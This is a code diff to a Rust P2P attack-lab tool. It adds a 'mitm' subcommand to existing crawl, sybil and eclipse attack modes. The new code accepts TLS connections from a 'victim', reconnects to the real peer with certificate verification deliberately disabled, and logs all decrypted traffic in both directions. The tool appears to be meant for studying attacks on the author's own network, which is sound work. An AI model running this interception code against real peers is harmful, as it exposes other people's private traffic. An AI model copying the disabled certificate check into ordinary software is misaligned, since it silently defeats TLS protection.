@@ -1,11 +1,20 @@
 use p2p_core::{Message, NodeId};
 use std::collections::{HashSet, VecDeque};
 use std::net::SocketAddr;
+use std::sync::Arc;
 use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
+use tokio::net::TcpListener;
 use tokio::net::TcpStream;
+use tokio_rustls::rustls;
+use tokio_rustls::rustls::ClientConfig;
+use tokio_rustls::rustls::pki_types::ServerName;
+use tokio_rustls::{TlsAcceptor, TlsConnector};
 
 #[tokio::main]
 async fn main() {
+    rustls::crypto::ring::default_provider()
+        .install_default()
+        .ok();
     let args: Vec<String> = std::env::args().collect();
     match args[1].as_str() {
         "crawl" => {
@@ -25,7 +34,12 @@ async fn main() {
             let target: SocketAddr = args[2].parse().unwrap();
             eclipse(target).await;
         }
-        _ => eprintln!("Usage: p2p-lab <crawl|sybil> <addr> [count]"),
+        "mitm" => {
+            let listen_port: u16 = args[2].parse().unwrap();
+            let real_target: SocketAddr = args[3].parse().unwrap();
+            mitm(listen_port, real_target).await;
+        }
+        _ => eprintln!("Usage: p2p-lab <crawl|sybil>|monitor|eclipse|mitm <addr> [count]"),
     }
 }
 
@@ -273,5 +287,74 @@ async fn eclipse(target: SocketAddr) {
     tokio::signal::ctrl_c().await.unwrap();
     for h in handles {
         h.abort();
+    }
+}
+
+async fn mitm(listen_port: u16, real_target: SocketAddr) {
+    println!("=== TLS MITM ===");
+    println!("Listening on: 127.0.0.1:{listen_port}");
+    println!("Proxying to : {real_target}");
+
+    let (server_config, _, _) = p2p_node::make_tls_config();
+    let acceptor = TlsAcceptor::from(Arc::new(server_config));
+
+    let listener = TcpListener::bind(format!("127.0.0.1:{listen_port}"))
+        .await
+        .unwrap();
+
+    loop {
+        if let Ok((tcp_stream, victim_addr)) = listener.accept().await {
+            println!("[mitm] victim connected from {victim_addr}");
+            let acceptor = acceptor.clone();
+            tokio::spawn(async move {
+                // complete TLS with victim
+                let Ok(victim_tls) = acceptor.accept(tcp_stream).await else {
+                    eprintln!("[mitm] TLS accept failed");
+                    return;
+                };
+                println!("[mitm] TLS established with victim");
+                // connect to real target with TLS
+                let client_config = ClientConfig::builder()
+                    .dangerous()
+                    .with_custom_certificate_verifier(Arc::new(p2p_node::NoVerifier))
+                    .with_no_client_auth();
+                let connector = TlsConnector::from(Arc::new(client_config));
+                let tcp_to_target = tokio::net::TcpStream::connect(real_target).await.unwrap();
+                let server_name = ServerName::try_from("localhost").unwrap();
+                let Ok(target_tls) = connector.connect(server_name, tcp_to_target).await else {
+                    eprintln!("[mitm] TLS connect to target failed");
+                    return;
+                };
+                println!("[mitm] TLS established with target");
+
+                // bidirectional proxy with logging
+                let (victim_read, victim_write) = tokio::io::split(victim_tls);
+                let victim_read = BufReader::new(victim_read);
+                let (target_read, target_write) = tokio::io::split(target_tls);
+                let target_read = BufReader::new(target_read);
+                let v2t = proxy_direction("victim->target", victim_read, target_write);
+                let t2v = proxy_direction("target->victim", target_read, victim_write);
+
+                tokio::join!(v2t, t2v);
+            });
+        }
+    }
+}
+
+async fn proxy_direction<R, W>(label: &'static str, mut reader: R, mut writer: W)
+where
+    R: tokio::io::AsyncBufRead + Unpin,
+    W: tokio::io::AsyncWrite + Unpin,
+{
+    let mut line = String::new();
+    loop {
+        line.clear();
+        if reader.read_line(&mut line).await.unwrap_or(0) == 0 {
+            break;
+        }
+        println!("[mitm][{label}] {}", line.trim());
+        if writer.write_all(line.as_bytes()).await.is_err() {
+            break;
+        }
     }
 }
